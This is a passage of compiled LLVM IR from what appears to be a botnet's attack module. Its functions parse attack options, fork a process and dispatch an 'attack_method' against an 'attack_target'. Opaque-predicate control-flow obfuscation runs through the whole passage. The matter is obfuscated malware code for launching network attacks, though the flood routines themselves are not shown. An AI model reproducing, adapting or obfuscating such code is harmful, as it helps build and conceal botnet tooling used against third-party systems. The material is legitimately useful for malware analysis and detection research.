  %420 = sub i32 %418, 1
  %421 = mul i32 %418, %420
  %422 = urem i32 %421, 2
  %423 = icmp eq i32 %422, 0
  %424 = icmp slt i32 %419, 10
  %425 = or i1 %423, %424
  br i1 %425, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %417
  %426 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %427 = icmp ne %struct.attack_option* %426, null
  %428 = load i32, i32* @x.5
  %429 = load i32, i32* @y.6
  %430 = sub i32 %428, 1
  %431 = mul i32 %428, %430
  %432 = urem i32 %431, 2
  %433 = icmp eq i32 %432, 0
  %434 = icmp slt i32 %429, 10
  %435 = or i1 %433, %434
  br i1 %435, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br i1 %427, label %436, label %456

; <label>:436:                                    ; preds = %originalBBpart254
  %437 = load i32, i32* @x.5
  %438 = load i32, i32* @y.6
  %439 = sub i32 %437, 1
  %440 = mul i32 %437, %439
  %441 = urem i32 %440, 2
  %442 = icmp eq i32 %441, 0
  %443 = icmp slt i32 %438, 10
  %444 = or i1 %442, %443
  br i1 %444, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %436
  %445 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %446 = load i8, i8* %17, align 1
  %447 = zext i8 %446 to i32
  call void @free_opts(%struct.attack_option* %445, i32 %447)
  %448 = load i32, i32* @x.5
  %449 = load i32, i32* @y.6
  %450 = sub i32 %448, 1
  %451 = mul i32 %448, %450
  %452 = urem i32 %451, 2
  %453 = icmp eq i32 %452, 0
  %454 = icmp slt i32 %449, 10
  %455 = or i1 %453, %454
  br i1 %455, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br label %456

; <label>:456:                                    ; preds = %originalBBpart258, %originalBBpart254
  %457 = load i32, i32* @x.5
  %458 = load i32, i32* @y.6
  %459 = sub i32 %457, 1
  %460 = mul i32 %457, %459
  %461 = urem i32 %460, 2
  %462 = icmp eq i32 %461, 0
  %463 = icmp slt i32 %458, 10
  %464 = or i1 %462, %463
  br i1 %464, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %456
  %465 = load i32, i32* @x.5
  %466 = load i32, i32* @y.6
  %467 = sub i32 %465, 1
  %468 = mul i32 %465, %467
  %469 = urem i32 %468, 2
  %470 = icmp eq i32 %469, 0
  %471 = icmp slt i32 %466, 10
  %472 = or i1 %470, %471
  br i1 %472, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %473 = alloca i8*, align 8
  %474 = alloca i32, align 4
  %475 = alloca i32, align 4
  %476 = alloca i32, align 4
  %477 = alloca i8, align 1
  %478 = alloca i8, align 1
  %479 = alloca i8, align 1
  %480 = alloca %struct.attack_target*, align 8
  %481 = alloca %struct.attack_option*, align 8
  %482 = alloca i8, align 1
  store i8* %0, i8** %473, align 8
  store i32 %1, i32* %474, align 4
  store i32 0, i32* %475, align 4
  store %struct.attack_target* null, %struct.attack_target** %480, align 8
  store %struct.attack_option* null, %struct.attack_option** %481, align 8
  %483 = load i32, i32* %474, align 4
  %484 = sext i32 %483 to i64
  %485 = icmp ult i64 %484, 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %33
  %486 = load i8*, i8** %11, align 8
  %487 = bitcast i8* %486 to i32*
  %488 = load i32, i32* %487, align 4
  %489 = call i32 @ntohl(i32 %488) #7
  store i32 %489, i32* %14, align 4
  %490 = load i8*, i8** %11, align 8
  %491 = getelementptr inbounds i8, i8* %490, i64 4
  store i8* %491, i8** %11, align 8
  %492 = load i32, i32* %12, align 4
  %493 = sext i32 %492 to i64
  %_ = shl i64 %493, 4
  %494 = sub i64 %493, 4
  %495 = trunc i64 %494 to i32
  store i32 %495, i32* %12, align 4
  %496 = load i32, i32* %12, align 4
  %497 = icmp eq i32 %496, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %62
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %101
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %118
  %498 = load i32, i32* %12, align 4
  %499 = sext i32 %498 to i64
  %500 = load i8, i8* %16, align 1
  %501 = zext i8 %500 to i64
  %_15 = sub i64 0, 5
  %gen = add i64 %_15, %501
  %_16 = sub i64 5, %501
  %gen17 = mul i64 %_16, %501
  %502 = mul i64 5, %501
  %503 = icmp ult i64 %499, %502
  br label %originalBB14

originalBB21alteredBB:                            ; preds = %originalBB21, %201
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %243
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %260
  %504 = load i8*, i8** %11, align 8
  %505 = getelementptr inbounds i8, i8* %504, i32 1
  store i8* %505, i8** %11, align 8
  %506 = load i8, i8* %504, align 1
  %507 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %508 = load i32, i32* %13, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %507, i64 %509
  %511 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %510, i32 0, i32 1
  store i8 %506, i8* %511, align 8
  %512 = load i32, i32* %12, align 4
  %513 = sext i32 %512 to i64
  %_30 = shl i64 %513, 1
  %_31 = sub i64 0, %513
  %gen32 = add i64 %_31, 1
  %514 = sub i64 %513, 1
  %515 = trunc i64 %514 to i32
  store i32 %515, i32* %12, align 4
  %516 = load i32, i32* %12, align 4
  %517 = sext i32 %516 to i64
  %518 = icmp ult i64 %517, 1
  br label %originalBB29

originalBB36alteredBB:                            ; preds = %originalBB36, %292
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %321
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %371
  %519 = call i32* @__errno_location() #7
  store i32 0, i32* %519, align 4
  %520 = load i32, i32* %14, align 4
  %521 = load i8, i8* %15, align 1
  %522 = load i8, i8* %16, align 1
  %523 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %524 = load i8, i8* %17, align 1
  %525 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  call void @attack_start(i32 %520, i8 zeroext %521, i8 zeroext %522, %struct.attack_target* %523, i8 zeroext %524, %struct.attack_option* %525)
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %398
  %526 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %527 = bitcast %struct.attack_target* %526 to i8*
  call void @free(i8* %527) #6
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %417
  %528 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %529 = icmp ne %struct.attack_option* %528, null
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %436
  %530 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %531 = load i8, i8* %17, align 1
  %532 = zext i8 %531 to i32
  call void @free_opts(%struct.attack_option* %530, i32 %532)
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %456
  br label %originalBB60
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = load i32, i32* @x.7
  %8 = load i32, i32* @y.8
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_target*, align 8
  %19 = alloca i8, align 1
  %20 = alloca %struct.attack_option*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  store i32 %0, i32* %15, align 4
  store i8 %1, i8* %16, align 1
  store i8 %2, i8* %17, align 1
  store %struct.attack_target* %3, %struct.attack_target** %18, align 8
  store i8 %4, i8* %19, align 1
  store %struct.attack_option* %5, %struct.attack_option** %20, align 8
  %23 = call i32 @fork() #6
  store i32 %23, i32* %21, align 4
  %24 = load i32, i32* %21, align 4
  %25 = icmp sgt i32 %24, 0
  %26 = load i32, i32* @x.7
  %27 = load i32, i32* @y.8
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %25, label %37, label %34

; <label>:34:                                     ; preds = %originalBBpart2
  %35 = load i32, i32* %21, align 4
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34, %originalBBpart2
  ret void

; <label>:38:                                     ; preds = %34
  store i32 0, i32* %22, align 4
  store i32 0, i32* %22, align 4
  br label %39

; <label>:39:                                     ; preds = %102, %38
  %40 = load i32, i32* %22, align 4
  %41 = load i8, i8* @methods_len, align 1
  %42 = zext i8 %41 to i32
  %43 = icmp slt i32 %40, %42
  br i1 %43, label %44, label %105

; <label>:44:                                     ; preds = %39
  %45 = load i32, i32* @x.7
  %46 = load i32, i32* @y.8
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %44
  %53 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %54 = load i32, i32* %22, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %53, i64 %55
  %57 = load %struct.attack_method*, %struct.attack_method** %56, align 8
  %58 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %57, i32 0, i32 1
  %59 = load i8, i8* %58, align 8
  %60 = zext i8 %59 to i32
  %61 = load i8, i8* %16, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp eq i32 %60, %62
  %64 = load i32, i32* @x.7
  %65 = load i32, i32* @y.8
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %63, label %72, label %85

; <label>:72:                                     ; preds = %originalBBpart24
  %73 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %74 = load i32, i32* %22, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %73, i64 %75
  %77 = load %struct.attack_method*, %struct.attack_method** %76, align 8
  %78 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %77, i32 0, i32 0
  %79 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %78, align 8
  %80 = load i32, i32* %15, align 4
  %81 = load i8, i8* %17, align 1
  %82 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %83 = load i8, i8* %19, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %20, align 8
  call void %79(i32 %80, i8 zeroext %81, %struct.attack_target* %82, i8 zeroext %83, %struct.attack_option* %84)
  br label %105

; <label>:85:                                     ; preds = %originalBBpart24
  %86 = load i32, i32* @x.7
  %87 = load i32, i32* @y.8
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %85
  %94 = load i32, i32* @x.7
  %95 = load i32, i32* @y.8
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %102

; <label>:102:                                    ; preds = %originalBBpart28
  %103 = load i32, i32* %22, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %22, align 4
  br label %39

; <label>:105:                                    ; preds = %72, %39
  %106 = load i32, i32* @x.7
  %107 = load i32, i32* @y.8
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %105
  call void @exit(i32 0) #8
  %114 = load i32, i32* @x.7
  %115 = load i32, i32* @y.8
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  unreachable

originalBBalteredBB:                              ; preds = %originalBB, %6
  %122 = alloca i32, align 4
  %123 = alloca i8, align 1
  %124 = alloca i8, align 1
  %125 = alloca %struct.attack_target*, align 8
  %126 = alloca i8, align 1
  %127 = alloca %struct.attack_option*, align 8
  %128 = alloca i32, align 4
  %129 = alloca i32, align 4
  store i32 %0, i32* %122, align 4
  store i8 %1, i8* %123, align 1
  store i8 %2, i8* %124, align 1
  store %struct.attack_target* %3, %struct.attack_target** %125, align 8
  store i8 %4, i8* %126, align 1
  store %struct.attack_option* %5, %struct.attack_option** %127, align 8
  %130 = call i32 @fork() #6
  store i32 %130, i32* %128, align 4
  %131 = load i32, i32* %128, align 4
  %132 = icmp sgt i32 %131, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %44
  %133 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %134 = load i32, i32* %22, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %133, i64 %135
  %137 = load %struct.attack_method*, %struct.attack_method** %136, align 8
  %138 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %137, i32 0, i32 1
  %139 = load i8, i8* %138, align 8
  %140 = zext i8 %139 to i32
  %141 = load i8, i8* %16, align 1
  %142 = zext i8 %141 to i32
  %143 = icmp eq i32 %140, %142
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %85
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %105
  call void @exit(i32 0) #8
  br label %originalBB10
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %68

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %originalBBpart26, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %65

; <label>:14:                                     ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* %28) #6
  br label %29

; <label>:29:                                     ; preds = %22, %14
  %30 = load i32, i32* @x.9
  %31 = load i32, i32* @y.10
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %29
  %38 = load i32, i32* @x.9
  %39 = load i32, i32* @y.10
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %46

; <label>:46:                                     ; preds = %originalBBpart2
  %47 = load i32, i32* @x.9
  %48 = load i32, i32* @y.10
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = load i32, i32* %5, align 4
  %56 = add nsw i32 %55, 1
  store i32 %56, i32* %5, align 4
  %57 = load i32, i32* @x.9
  %58 = load i32, i32* @y.10
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart26, label %originalBB1alteredBB

originalBBpart26:                                 ; preds = %originalBB1
  br label %10

; <label>:65:                                     ; preds = %10
  %66 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %67 = bitcast %struct.attack_option* %66 to i8*
  call void @free(i8* %67) #6
  br label %68

; <label>:68:                                     ; preds = %65, %8
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %29
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  %69 = load i32, i32* %5, align 4
  %_ = shl i32 %69, 1
  %_2 = sub i32 0, %69
  %gen = add i32 %_2, 1
  %_3 = sub i32 0, %69
  %gen4 = add i32 %_3, 1
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %5, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %originalBBpart28, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %86

; <label>:16:                                     ; preds = %11
  %17 = load i32, i32* @x.11
  %18 = load i32, i32* @y.12
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %26 = load i32, i32* %10, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %25, i64 %27
  %29 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i32 0, i32 1
  %30 = load i8, i8* %29, align 8
  %31 = zext i8 %30 to i32
  %32 = load i8, i8* %8, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %31, %33
  %35 = load i32, i32* @x.11
  %36 = load i32, i32* @y.12
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %34, label %43, label %50

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %45 = load i32, i32* %10, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %44, i64 %46
  %48 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %47, i32 0, i32 0
  %49 = load i8*, i8** %48, align 8
  store i8* %49, i8** %5, align 8
  br label %88

; <label>:50:                                     ; preds = %originalBBpart2
  %51 = load i32, i32* @x.11
  %52 = load i32, i32* @y.12
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %50
  %59 = load i32, i32* @x.11
  %60 = load i32, i32* @y.12
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %67

; <label>:67:                                     ; preds = %originalBBpart24
  %68 = load i32, i32* @x.11
  %69 = load i32, i32* @y.12
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %67
  %76 = load i32, i32* %10, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %10, align 4
  %78 = load i32, i32* @x.11
  %79 = load i32, i32* @y.12
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %11

; <label>:86:                                     ; preds = %11
  %87 = load i8*, i8** %9, align 8
  store i8* %87, i8** %5, align 8
  br label %88

; <label>:88:                                     ; preds = %86, %43
  %89 = load i8*, i8** %5, align 8
  ret i8* %89

originalBBalteredBB:                              ; preds = %originalBB, %16
  %90 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %90, i64 %92
  %94 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %93, i32 0, i32 1
  %95 = load i8, i8* %94, align 8
  %96 = zext i8 %95 to i32
  %97 = load i8, i8* %8, align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %96, %98
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %50
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %67
  %100 = load i32, i32* %10, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %10, align 4
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %35

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* @x.13
  %19 = load i32, i32* @y.14
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  %26 = load i32, i32* %9, align 4
  store i32 %26, i32* %5, align 4
  %27 = load i32, i32* @x.13
  %28 = load i32, i32* @y.14
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %38

; <label>:35:                                     ; preds = %4
  %36 = load i8*, i8** %10, align 8
  %37 = call i32 @util_atoi(i8* %36, i32 10)
  store i32 %37, i32* %5, align 4
  br label %38

; <label>:38:                                     ; preds = %35, %originalBBpart2
  %39 = load i32, i32* @x.13
  %40 = load i32, i32* @y.14
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load i32, i32* %5, align 4
  %48 = load i32, i32* @x.13
  %49 = load i32, i32* @y.14
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %47

originalBBalteredBB:                              ; preds = %originalBB, %17
  %56 = load i32, i32* %9, align 4
  store i32 %56, i32* %5, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  %57 = load i32, i32* %5, align 4
  br label %originalBB1
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %38

; <label>:19:                                     ; preds = %4
  %20 = load i32, i32* @x.15
  %21 = load i32, i32* @y.16
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = load i8*, i8** %10, align 8
  %29 = call i32 @inet_addr(i8* %28) #6
  store i32 %29, i32* %5, align 4
  %30 = load i32, i32* @x.15
  %31 = load i32, i32* @y.16
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
